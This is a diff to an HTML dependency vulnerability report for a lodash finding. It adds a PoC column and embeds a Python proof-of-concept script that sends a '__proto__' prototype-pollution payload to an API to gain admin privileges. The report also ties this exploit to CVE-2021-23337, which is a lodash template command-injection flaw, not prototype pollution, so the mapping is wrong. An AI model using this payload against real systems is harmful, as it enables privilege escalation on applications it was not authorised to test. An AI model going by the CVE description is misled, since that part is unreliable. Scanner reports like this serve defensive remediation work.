@@ -70,7 +70,7 @@
             <div class="container">
                 <h1>Dependency Vulnerability Report</h1>
                 <p>Project: package</p>
-                <p>Scan Time: 2026-04-01T22:53:25.363003</p>
+                <p>Scan Time: 2026-04-02T08:14:52.881391</p>
                 
                 <div class="summary">
                     <div class="card critical">
@@ -103,6 +103,7 @@
                             <th>Severity</th>
                             <th>Patch Available</th>
                             <th>Effort</th>
+                            <th>PoC</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -119,6 +120,7 @@
                             <td><span class="high">HIGH</span></td>
                             <td>✓ Yes</td>
                             <td>low</td>
+                            <td title="PoC snippet"># Prototype Pollution PoC - CVE-2021-23337 (lodash) # Vulnerable: lodash.merge() with user-controlled input  import requ...</td>
                         </tr>
             
                     </tbody>
@@ -132,7 +134,7 @@
                 
                 <script>
                     // Add remediation items
-                    const findings = [{"package": "lodash", "version": "4.17.20", "ecosystem": "npm", "source": "package.json", "transitive": false, "cve": "CVE-2021-23337", "severity": "high", "description": "Prototype pollution in lodash before 4.17.21.", "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337", "fixed_version": "4.17.21", "has_patch": true, "effort": "low", "recommended_version": "4.17.21"}];
+                    const findings = [{"package": "lodash", "version": "4.17.20", "ecosystem": "npm", "source": "package.json", "transitive": false, "cve": "CVE-2021-23337", "severity": "high", "description": "Prototype pollution in lodash before 4.17.21.", "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337", "fixed_version": "4.17.21", "has_patch": true, "effort": "low", "recommended_version": "4.17.21", "poc": "\n# Prototype Pollution PoC - CVE-2021-23337 (lodash)\n# Vulnerable: lodash.merge() with user-controlled input\n\nimport requests\nimport json\n\ntarget = \"http://vulnerable-app.local/api/config\"\n\n# Prototype pollution payload\n# This modifies Object.prototype, affecting all objects\npayload = {\n    \"admin\": {\n        \"__proto__\": {\n            \"isAdmin\": True\n        }\n    }\n}\n\nresponse = requests.post(\n    target,\n    json=payload,\n    headers={\"Content-Type\": \"application/json\"}\n)\n\n# If vulnerable, subsequent requests will have isAdmin=true\nverify_response = requests.get(target)\ndata = verify_response.json()\n\nif data.get(\"isAdmin\"):\n    print(\"[+] Prototype Pollution successful!\")\n    print(\"[+] User now has admin privileges\")\n"}];
                     const list = document.getElementById('remediation-list');
                     
                     findings.forEach(f => {
